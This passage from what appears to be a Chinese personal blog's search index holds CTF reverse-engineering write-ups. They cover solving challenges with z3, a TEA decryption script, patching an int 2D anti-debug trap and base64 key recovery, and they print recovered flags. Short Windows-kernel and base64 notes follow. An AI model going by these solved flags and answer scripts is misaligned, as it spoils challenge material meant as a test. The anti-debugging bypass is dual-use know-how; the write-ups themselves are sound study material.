class="number">0x06</span>, <span class="number">0xF3</span>, <span class="number">0x1A</span>, <span class="number">0xA8</span>, <span class="number">0x09</span>, <span class="number">0xDC</span>, <span class="number">0x7C</span>, <span class="number">0x4B</span>, <span class="number">0x5C</span>, <span class="number">0x1E</span>, <span class="number">0xA1</span>, <span class="number">0xB0</span>, <span class="number">0x71</span>, <span class="number">0x04</span>, <span class="number">0xE2</span>, <span class="number">0x9B</span>, <span class="number">0xB7</span>, <span class="number">0x10</span>, <span class="number">0x4E</span>, <span class="number">0x16</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x56</span>, <span class="number">0xD8</span>, <span class="number">0x61</span>, <span class="number">0xB4</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0x87</span>, <span class="number">0xF8</span>, <span class="number">0x0A</span>, <span class="number">0x13</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0x1C</span>, <span class="number">0x35</span>, <span class="number">0x2C</span>, <span class="number">0xB1</span>, <span class="number">0xEC</span>, <span class="number">0x93</span>, <span class="number">0x66</span>, <span class="number">0x03</span>, <span class="number">0xA9</span>, <span class="number">0x95</span>, <span class="number">0xBB</span>, <span class="number">0xD3</span>, <span class="number">0x51</span>, <span class="number">0x39</span>, <span class="number">0xE7</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0x29</span>, <span class="number">0x72</span>, <span class="number">0x47</span>, <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x15</span>, <span class="number">0xDF</span>, <span class="number">0xD9</span>, <span class="number">0x17</span>, <span class="number">0x74</span>, <span class="number">0x3F</span>, <span class="number">0x62</span>, <span class="number">0xCD</span>, <span class="number">0x41</span>, <span class="number">0x07</span>, <span class="number">0x73</span>, <span class="number">0x53</span>, <span class="number">0x85</span>, <span class="number">0x31</span>, <span class="number">0x8A</span>, <span class="number">0x30</span>, <span class="number">0xAA</span>, <span class="number">0xAC</span>, <span class="number">0x2E</span>, <span class="number">0xA3</span>, <span class="number">0x50</span>, <span class="number">0x7A</span>, <span class="number">0xB5</span>, <span class="number">0x8E</span>, <span class="number">0x69</span>, <span class="number">0x1F</span>, <span class="number">0x6A</span>, <span class="number">0x97</span>, <span class="number">0x55</span>, <span class="number">0x3A</span>, <span class="number">0xB2</span>, <span class="number">0x59</span>, <span class="number">0xAB</span>, <span class="number">0xE0</span>, <span class="number">0x28</span>, <span class="number">0xC0</span>, <span class="number">0xB3</span>, <span class="number">0xBE</span>, <span class="number">0xCC</span>, <span class="number">0xC6</span>, <span class="number">0x2B</span>, <span class="number">0x5B</span>, <span class="number">0x92</span>, <span class="number">0xEE</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x84</span>, <span class="number">0x4D</span>, <span class="number">0x0F</span>, <span class="number">0x26</span>, <span class="number">0x4A</span>, <span class="number">0x48</span>, <span class="number">0x0B</span>, <span class="number">0x36</span>, <span class="number">0x80</span>, <span class="number">0x5D</span>, <span class="number">0x6F</span>, <span class="number">0x4C</span>, <span class="number">0xB9</span>, <span class="number">0x81</span>, <span class="number">0x96</span>, <span class="number">0x32</span>, <span class="number">0xFD</span>, <span class="number">0x40</span>, <span class="number">0x8D</span>, <span class="number">0x27</span>, <span class="number">0xC1</span>, <span class="number">0x78</span>, <span class="number">0x4F</span>, <span class="number">0x79</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0x8C</span>, <span class="number">0xE5</span>, <span class="number">0x9E</span>, <span class="number">0xAE</span>, <span class="number">0xBF</span>, <span class="number">0xEF</span>, <span class="number">0x42</span>, <span class="number">0xC5</span>, <span class="number">0xAF</span>, <span class="number">0xA0</span>, <span class="number">0xC2</span>, <span class="number">0xFA</span>, <span class="number">0xC7</span>, <span class="number">0xB6</span>, <span class="number">0xDB</span>, <span class="number">0x18</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0xFE</span>, <span class="number">0xE9</span>, <span class="number">0xF5</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x2F</span>, <span class="number">0xF1</span>, <span class="number">0x1B</span>, <span class="number">0xFB</span>, <span class="number">0xBA</span>, <span class="number">0xA7</span>, <span class="number">0x37</span>, <span class="number">0x8F</span>]</span><br><span class="line">key = [<span class="number">128</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">f&quot;flag[<span class="subst">&#123;i&#125;</span>]&quot;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x28</span>,<span class="number">8</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">v0 = ((key[j] &amp; flag[i + <span class="number">3</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">3</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">3</span>]) &gt;&gt; ((<span class="number">3</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">2</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">2</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">2</span>]) &gt;&gt; ((<span class="number">2</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">1</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">1</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">1</span>]) &gt;&gt; ((<span class="number">1</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i]) &lt;&lt; (<span class="number">8</span> - -j % <span class="number">8</span>)) | ((key[j] &amp; flag[i]) &gt;&gt; (-j % <span class="number">8</span>))</span><br><span class="line">Buf2_ = ((key[j] &amp; flag[i + <span class="number">7</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">7</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">7</span>]) &gt;&gt; ((<span class="number">7</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">6</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">6</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">6</span>]) &gt;&gt; ((<span class="number">6</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">5</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">5</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">5</span>]) &gt;&gt; ((<span class="number">5</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">4</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">4</span> - j) % <span class="number">8</span>)) | ((key[j] &amp; flag[i + <span class="number">4</span>]) &gt;&gt; ((<span class="number">4</span> - j) % <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">s.add(v0 | Buf2_ == byte_405000.index(Buf2[i+j]))<span class="comment"># 算出结果和数组比对</span></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line"></span><br><span class="line">flag1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">flag1.append(<span class="built_in">chr</span>(m[i].as_long()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag1))</span><br></pre></td></tr></table></figure><h3 id="TacticalArmed"><a href="#TacticalArmed" class="headerlink" title="TacticalArmed"></a>TacticalArmed</h3><p>程序开始时有反调试，把int 2D patch成int 3之后就可以动调。<br>抛出异常后会初始化四个常量，调试可以得到4011F0函数处smc执行后的字节码。</p><p>smc可以识别，但脱包不熟练</p><p><strong>复现不出来脱包过程，之后再试试</strong></p><p>只能在静态看看555</p><p>查看函数发现TlsCallback_0函数，进入函数，发现startAddress中存在int 2Dh，限制动调，在调试的时候不会去抛出异常，正常执行的时候抛出异常，也就是说需要抛出异常才是正常情况，可能那里藏了什么，跟踪一下</p><p>在OD中打开将其设置为int 3h。</p><p>继续无脑按F8发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">mov     eax, 4</span><br><span class="line">imul    ecx, eax, 0;imul为有符号数乘法</span><br><span class="line">mov     dword_405000[ecx], 7CE45630h</span><br><span class="line"></span><br><span class="line">mov     eax, 4</span><br><span class="line">shl     eax, 0;shl为逻辑左移一位</span><br><span class="line">mov     dword_405000[eax], 58334908h</span><br><span class="line"></span><br><span class="line">mov     eax, 4</span><br><span class="line">shl     eax, 1</span><br><span class="line">mov     dword_405000[eax], 66398867h</span><br><span class="line"></span><br><span class="line">mov     eax, 4</span><br><span class="line">imul    ecx, eax, 3</span><br><span class="line">mov     dword_405000[ecx], 0C35195B1h</span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh</span><br></pre></td></tr></table></figure><p>运行到主函数发现每次循环，里面的指令都不一样，这里应该是一个动态解码的过程，分析这个算法应该为tea算法，确定delta为0x81A5692e</p><p>反汇编可见 右移5左移4XOR 推测是TEA加密输入值后比较是否一致，写解密脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k,<span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x81A5692e</span>*<span class="number">33</span>*(z+<span class="number">1</span>), i;         </span><br><span class="line">  <span class="keyword">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>]; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;  </span><br><span class="line">    v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">    sum -= <span class="number">0x81A5692e</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> key[] = &#123;<span class="number">0x7CE45630</span>, <span class="number">0x58334908</span>, <span class="number">0x66398867</span>, <span class="number">0x0C35195B1</span>&#125;;</span><br><span class="line"><span class="keyword">int8_t</span> ida_chars[<span class="number">40</span>] =&#123;<span class="number">0xED</span>, <span class="number">0x1D</span>, <span class="number">0x2F</span>, <span class="number">0x42</span>, <span class="number">0x72</span>, <span class="number">0xE4</span>, <span class="number">0x85</span>, <span class="number">0x14</span>, <span class="number">0xD5</span>, <span class="number">0x78</span>, <span class="number">0x55</span>, <span class="number">0x03</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x6B</span>, <span class="number">0xBF</span>, <span class="number">0x45</span>, <span class="number">0x72</span>, <span class="number">0xD7</span>, <span class="number">0x97</span>, <span class="number">0xD1</span>, <span class="number">0x75</span>, <span class="number">0xAE</span>, <span class="number">0x2D</span>, <span class="number">0x63</span>, <span class="number">0xA9</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x74</span>, <span class="number">0x6D</span>, <span class="number">0x2E</span>, <span class="number">0x29</span>, <span class="number">0xC1</span>, <span class="number">0xFC</span>, <span class="number">0x95</span>, <span class="number">0x97</span>, <span class="number">0xE9</span>, <span class="number">0xC8</span>, <span class="number">0xB5</span>, <span class="number">0x0B</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>,j=<span class="number">0</span>; i &lt; <span class="number">40</span>,j &lt; <span class="number">5</span>; i += <span class="number">8</span>,j++) </span><br><span class="line">&#123;</span><br><span class="line">decrypt((<span class="keyword">uint32_t</span>*)(ida_chars + i), key , j);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,ida_chars);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Re4-虚假的粉丝"><a href="#Re4-虚假的粉丝" class="headerlink" title="Re4-虚假的粉丝"></a>Re4-虚假的粉丝</h3><p>看程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">FileName[<span class="number">16</span>] = (<span class="keyword">char</span>)key1 / <span class="number">-24</span> + <span class="number">48</span>;</span><br><span class="line">  v15 = (<span class="keyword">char</span>)(key1 / <span class="number">100</span>) % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">  v16 = (<span class="keyword">char</span>)(key1 / <span class="number">10</span>) % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">  v17 = key1 % <span class="number">10</span> + <span class="number">48</span>;  <span class="comment">//字符串转化为数字，预测是编号</span></span><br><span class="line">  v18 = <span class="string">&#x27;txt.&#x27;</span>;</span><br><span class="line">  Stream = fopen(FileName, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(Buffer));</span><br><span class="line">fseek(Stream, Offset, <span class="number">0</span>);</span><br><span class="line">fread(Buffer, ElementSize, <span class="number">1u</span>, Stream)</span><br><span class="line">sub_401350(<span class="string">&quot;%s\n&quot;</span>, Buffer);</span><br><span class="line">  <span class="keyword">if</span> ( Buffer[<span class="number">0</span>] != <span class="string">&#x27;U&#x27;</span> || Buffer[<span class="number">39</span>] != <span class="string">&#x27;S&#x27;</span> ) <span class="comment">//需要个40位的 首尾是U和S，拿everything搜一波，得到4157</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_401350(<span class="string">&quot;Sorry! Wrong Key.\n&quot;</span>);</span><br><span class="line">    fclose(Stream);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>key1为4157</p><p>继续分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fseek(Stream, key2, <span class="number">0</span>); <span class="comment">// key2为offest，偏移量为1118</span></span><br><span class="line">fread(Buffer, key3, <span class="number">1u</span>, Stream); <span class="comment">// key3为size，大小为40</span></span><br></pre></td></tr></table></figure><p>程序输出对其进行base64解密</p><p>UzNDcmU3X0szeSUyMCUzRCUyMEFsNE5fd0FsSzNS -&gt; S3Cre7_K3y%20%3D%20Al4N_wAlK3R得到key:Al4N_wAlK3R</p><p>然后在5315中即可得到flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:ii:,::iiriririi::.,.,,::ii;:::::i::::iiiiiii;irir;;i;::,::i:::::i::,::i:::iir;rii::ir:ii::::ii;i;i;i;i;iiii:</span><br><span class="line">::::@B@,iiririi:@B@B@B@B::i::<span class="number">2</span>@B:::B@q::i:::ii;iririi::B@Bi::B@B:,:@@U:,BBM:iirii,PB@B;::.@B5:i:i:i:iii:i::::</span><br><span class="line">::,@B@BY:iiri;i:B@B@B@B@::.L:@B@.:,@B@.:,<span class="number">7</span>jr,:i;iri;i:L@B@B.,G@@,.B@B@..B@F:irii:;B@B7,:.@B@B,:r:,Lv,:::,ju7,</span><br><span class="line">:,F@@:@B.:iirir::..B@ ..@B@BkS@B.:.B@B<span class="number">.7</span>@@@@@i:i;i;i:.@@,B@u..@BE @@@B:r@B,:ri;iiB@B@B.:@B@BG.iB@B@B@<span class="number">7.B</span>@B@B:</span><br><span class="line">,,@@BUB@B::;iriii:i@Bi.i@@Oi.BB@.,.@B@ @B@B@B@:ii;ii,@B@j@B@..X@B0B1v@@@B2:iirii:,B@<span class="number">2.</span>E@@;B@@i:@@v @@@ @@@O7.</span><br><span class="line">.B@@@B@@@r:iri;ii:<span class="number">7B</span>@i:i@B.,:<span class="number">2</span>@B5iuB@<span class="number">2.B</span>@B80@U:irii:LB@B@B@B@..B@B@..B@@@.:i;i;ii.@B5.@B@@@@@B,B@..B@B.:uB@BU</span><br><span class="line"><span class="number">7</span>@B;...@B@:i:iiiiir@Br:;B@ii::B@B@B@B,,UB@B@B::iii::B@B...v@B7,BB@B,,@B@<span class="number">0</span>::iiiii::B@F:,,..B@G.i@@:.@B@.@B@B@i</span><br><span class="line">:i:::::::i::::::ii:ii:i:i::ii::,;<span class="number">7</span>;,::i:,iL7::::::::;:::::::ri::::::i:::::i::,::::i:::i:i::::::ii:::::::LL:,,</span><br><span class="line">::iii;ii::B@B@B@:iiiiiiiiiiri;ii:i:iiiiiii::::B@B@@@:iiiiiii:iii:iiiiiiiiir@B@B@Mi:iiiiri;iiiiiiiiiiiiii:i:i:</span><br></pre></td></tr></table></figure><p>A_True_AW_14ns</p><p>挺难认的</p><h3 id="gghdl"><a href="#gghdl" class="headerlink" title="gghdl"></a>gghdl</h3><p>看函数存在VHPI，还有调用GHDI接口，搜索看不懂，但是动调可以发现就是把输入一一置换然后与常值比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./ghdl.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).readlines() <span class="comment"># ghdl为获取的数据</span></span><br><span class="line">cmp = []</span><br><span class="line">test = <span class="built_in">list</span>(</span><br><span class="line">    <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$ %&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~0000000000000000000000000000000000000&quot;</span>)</span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(f), <span class="number">2</span>):</span><br><span class="line">    <span class="comment"># print(f[i], f[i+1])</span></span><br><span class="line">    inin = f[i].strip().split(<span class="string">&#x27;      &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    cmpcmp = f[i+<span class="number">1</span>].strip().split(<span class="string">&#x27;      &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    cmp.append(cmpcmp)</span><br><span class="line">    dic[inin] = test[i // <span class="number">2</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(cmp) == <span class="built_in">len</span>(test)</span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp)):</span><br><span class="line">    val = cmp[i]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(dic[val], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;?&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>WP看不懂这道也不怎么会，之后搞吧</strong></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows系统编程</title>
      <link href="/2021/11/02/Windows%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2021/11/02/Windows%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核"><a href="#Windows内核" class="headerlink" title="Windows内核"></a>Windows内核</h1><h2 id="常见的函数后缀"><a href="#常见的函数后缀" class="headerlink" title="常见的函数后缀"></a>常见的函数后缀</h2><p>eg：MessageBox</p><p>A ASCII</p><p>W UNICODE</p><p>Ex 改进</p><p>32位调用的是stdcall，64位调用的是fastcall存在eax中</p><h2 id="0环的helloworld"><a href="#0环的helloworld" class="headerlink" title="0环的helloworld"></a>0环的helloworld</h2><p>NT驱动</p><p>WDM</p><p>WDF </p><p>UWDF</p>]]></content>
      
      
      
        <tags>
            
            <tag> System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base大家族</title>
      <link href="/2021/10/24/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/base%E5%AE%B6%E6%97%8F/"/>
      <url>/2021/10/24/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/base%E5%AE%B6%E6%97%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="base大家族与逆向分析"><a href="#base大家族与逆向分析" class="headerlink" title="base大家族与逆向分析"></a>base大家族与逆向分析</h1><p>base在逆向中也算常见的加密了</p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>下面讲解base64和32和16</p><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>以下内容为wiki解释</p><p><strong>Base64</strong>是一种基于64个可打印字符来表示二进制数据的表示方法。由于2^6=64，所以每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法，和之后BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。</p><p>Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据，包括MIME的电子邮件及XML的一些复杂数据。 </p><p><strong>编码规则</strong></p><blockquote><p>第一步，将每三个字节作为一组，一共是24个二进制位<br>第二步，将这24个二进制位分为四组，每个组有6个二进制位<br>第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节<br>第四步，根据下表，得到扩展后的每个字节的对应符号，这就是Base64的编码值</p></blockquote><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/Crypto/base/b1.png" alt="base64"></p><p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。在编码后的Base64文本后加上一个或两个=号，代表补足的字节数。也就是说，当最后剩余两个八位字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；如果最后剩余一个八位字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。 如下表：</p><p><img src="http://raw.githubusercontent.com/Phantomor/images/main/img/Crypto/base/b2.png" alt="b2"></p><p>C语言实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span 